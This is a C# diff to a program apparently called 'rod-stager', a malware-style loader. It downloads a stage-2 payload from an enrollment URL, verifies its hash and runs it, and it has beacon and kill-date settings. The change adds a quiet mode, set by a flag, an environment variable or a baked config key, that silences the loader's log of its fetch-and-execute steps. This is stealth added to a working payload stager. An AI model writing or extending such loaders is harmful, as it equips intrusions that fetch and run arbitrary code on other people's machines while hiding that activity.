@@ -49,10 +49,16 @@ internal static class StagerApp
             return 1;
         }
 
+        // The narration log: stderr while developing, a null sink when quiet
+        // (the -quiet flag, ROD_QUIET, or the bake's quiet key). Fatal paths
+        // below print regardless -- a loader that dies silently is
+        // undebuggable.
+        var log = Quiet ? TextWriter.Null : Console.Error;
+
         // The fetch rides the same anonymous listener enroll does; the token is
         // verified without being spent, so the stage-2 below can still spend it.
         var fetchUrl = FetchUrl(enrollUrl, payloadId);
-        Console.Error.WriteLine($"rod-stager: fetching stage-2 {payloadId} from {BaseOf(fetchUrl)}");
+        log.WriteLine($"rod-stager: fetching stage-2 {payloadId} from {BaseOf(fetchUrl)}");
         byte[] stage2;
         try
         {
@@ -95,7 +101,7 @@ internal static class StagerApp
             return 1;
         }
 
-        Console.Error.WriteLine($"rod-stager: running stage-2 ({stage2.Length} bytes)");
+        log.WriteLine($"rod-stager: running stage-2 ({stage2.Length} bytes)");
         var start = new System.Diagnostics.ProcessStartInfo
         {
             FileName = stage2Path,
@@ -122,6 +128,12 @@ internal static class StagerApp
 
     private static string ExpectedSha256 { get; set; } = "";
 
+    // Quiet is read after the bake and the flags have both run, so either source
+    // turns it on (an explicit ROD_QUIET=0 preset before launch beats the bake).
+    private static bool Quiet =>
+        Environment.GetEnvironmentVariable("ROD_QUIET") is { Length: > 0 } v
+            && (v == "1" || v.Equals("true", StringComparison.OrdinalIgnoreCase));
+
     private static (string Token, string EnrollUrl, string PayloadId, string OutDir, string? BeaconUrl, string? CaCertPath) ParseArgs(
         string[] args)
     {
@@ -138,7 +150,7 @@ internal static class StagerApp
             {
                 case "-h" or "--help":
                     Console.Error.WriteLine(
-                        "usage: rod-stager -token <secret> [-enroll-url <url>] [-payload <guid>] [-beacon-url <host:port>] [-out-dir <dir>] [-ca-cert <pem>]");
+                        "usage: rod-stager -token <secret> [-enroll-url <url>] [-payload <guid>] [-beacon-url <host:port>] [-out-dir <dir>] [-ca-cert <pem>] [-quiet]");
                     throw new ExitProgramException(0, null);
                 case "-token" or "--token":
                     token = Value(args, ref i);
@@ -157,6 +169,9 @@ internal static class StagerApp
                     break;
                 case "-ca-cert" or "--ca-cert":
                     caCert = Value(args, ref i);
+                    break;
+                case "-quiet" or "--quiet":
+                    Environment.SetEnvironmentVariable("ROD_QUIET", "1");
                     break;
                 default:
                     throw new ExitProgramException(1, $"unknown flag {args[i]}");
@@ -199,6 +214,7 @@ internal static class StagerApp
             SetEnvIfPresent(root, "enrollURL", "ROD_ENROLL_URL");
             SetEnvIfPresent(root, "stage2PayloadId", "ROD_STAGE2_PAYLOAD_ID");
             SetEnvIfPresent(root, "killDate", "ROD_KILL_DATE");
+            SetEnvIfPresent(root, "quiet", "ROD_QUIET");
             if (root.TryGetProperty("stage2Sha256", out var sha)
                 && sha.ValueKind == System.Text.Json.JsonValueKind.String)
             {
